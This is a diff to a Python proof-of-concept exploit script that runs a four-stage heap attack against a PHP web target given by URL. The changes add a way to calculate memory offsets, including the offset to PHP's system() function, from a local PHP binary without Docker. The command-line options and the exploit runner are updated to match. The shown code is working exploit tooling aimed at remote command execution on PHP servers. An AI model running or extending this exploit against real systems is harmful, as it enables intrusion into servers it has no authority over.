@@ -26,7 +26,8 @@ Extracts code offsets from a Docker image, then runs the four-stage exploit:
                    --heap-depth 57 --heap-count 950 \\
                    --code-depth 58 --code-count 935
 
-Requires Docker (for image analysis) and Python 3.11+.  Standard library only.
+Requires Docker (for image analysis) or a local PHP binary, and Python 3.11+.
+Standard library only.
 """
 
 from __future__ import annotations
@@ -365,6 +366,19 @@ SHARED_LIB_GLOBS = [
     "/usr/lib/x86_64-linux-gnu/libphp*.so*",
     "/usr/lib/aarch64-linux-gnu/libphp*.so*",
 ]
+
+
+def binary_php_version(binary: Path) -> str | None:
+    """Try to extract PHP version string from an ELF binary's rodata."""
+    data = binary.read_bytes()
+    for pattern in [rb"X-Powered-By: PHP/(\d+\.\d+\.\d+[A-Za-z0-9._-]*)",
+                    rb"PHP/(\d+\.\d+\.\d+[A-Za-z0-9._-]*)",
+                    rb"PHP (\d+\.\d+\.\d+[A-Za-z0-9._-]*)"]:
+        for m in re.finditer(pattern, data):
+            version = m.group(1).decode("ascii", errors="replace")
+            if not version.startswith("0"):
+                return version
+    return None
 
 
 def _platform_args(platform: str | None) -> list[str]:
@@ -1080,6 +1094,41 @@ def calculate_offsets(image: str,
     return result
 
 
+def calculate_offsets_from_binary(
+        binary_path: str,
+        recalculate: bool = False) -> tuple[int, int, str]:
+    """Return (DTOR_LOW21, ZIF_SYSTEM_FROM_DTOR, php_version_string)
+    by analysing a local PHP binary directly (no Docker needed)."""
+    binary = Path(binary_path).resolve()
+    if not binary.is_file():
+        raise RuntimeError(f"Binary not found: {binary}")
+
+    cache_key = _cache_key(f"local_{binary.name}", None, None)
+    if not recalculate:
+        cached = _cache_load(f"local_{binary.name}", None, None)
+        if cached is not None:
+            print(f"[calc] cache hit for {binary.name}", flush=True)
+            return cached
+
+    print(f"[calc] analysing {binary} ({binary.stat().st_size:,} bytes)",
+          flush=True)
+
+    php_version = binary_php_version(binary) or "unknown"
+    print(f"[calc] PHP {php_version}", flush=True)
+
+    symbols: dict[str, int] = {}
+    analyse_binary(binary, symbols)
+
+    offsets = compute_offsets(symbols)
+    if "error" in offsets:
+        raise RuntimeError(f"offset calculation failed: {offsets['error']}")
+
+    result = (offsets["DTOR_LOW21"], offsets["ZIF_SYSTEM_FROM_DTOR"], php_version)
+    _cache_save(f"local_{binary.name}", None, None, *result)
+    print(f"[calc] cached to {CACHE_DIR}/", flush=True)
+    return result
+
+
 def _make_preflight():
     """Return a preflight function that checks the target is reachable."""
     def _preflight(target):
@@ -1151,13 +1200,15 @@ def apply_all(args, dtor_low21: int, zif_from_dtor: int,
     preflight = _make_preflight()
 
 
-def run_exploit(url: str, image: str, platform: str, output: Path) -> dict:
+def run_exploit(url: str, image: str | None, binary: str | None,
+                platform: str, output: Path) -> dict:
     """Execute all four stages and return the aggregated result dict."""
     target = parse_target(url)
 
     result: dict = {
         "target":   url,
         "image":    image,
+        "binary":   binary,
         "platform": platform,
         "calibration": {
             "DTOR_LOW21":           hex(DTOR_LOW21),
@@ -1234,8 +1285,14 @@ def main() -> int:
     # ── Required ─────────────────────────────────────────────────────────
     ap.add_argument("--url",   required=True,
                     help="Target endpoint")
-    ap.add_argument("--image", required=True,
-                    help="Docker image for offset calculation")
+
+    # ── Binary source (one of --image or --binary) ─────────────────────
+    src = ap.add_mutually_exclusive_group(required=True)
+    src.add_argument("--image",
+                     help="Docker image for offset calculation")
+    src.add_argument("--binary",
+                     help="Local PHP binary file for offset calculation "
+                          "(no Docker needed)")
     ap.add_argument("--platform", default="linux/amd64",
                     help="Docker platform for image pull "
                          "(default: linux/amd64)")
@@ -1315,8 +1372,12 @@ def main() -> int:
 
     # ── Calculate code offsets ───────────────────────────────────────────
     try:
-        dtor_low21, zif_from_dtor, php_version = calculate_offsets(
-            args.image, args.platform, args.php_path, args.recalculate)
+        if args.binary:
+            dtor_low21, zif_from_dtor, php_version = \
+                calculate_offsets_from_binary(args.binary, args.recalculate)
+        else:
+            dtor_low21, zif_from_dtor, php_version = calculate_offsets(
+                args.image, args.platform, args.php_path, args.recalculate)
     except RuntimeError as exc:
         print(f"[abort] {exc}", file=sys.stderr, flush=True)
         return 1
@@ -1333,7 +1394,8 @@ def main() -> int:
     output = args.output_dir or Path(f"tmp/poc-run-{stamp}")
     output.mkdir(parents=True, exist_ok=False)
 
-    result = run_exploit(args.url, args.image, args.platform, output)
+    result = run_exploit(args.url, args.image, args.binary, args.platform,
+                         output)
     return 0 if result.get("success") else 1
 
 
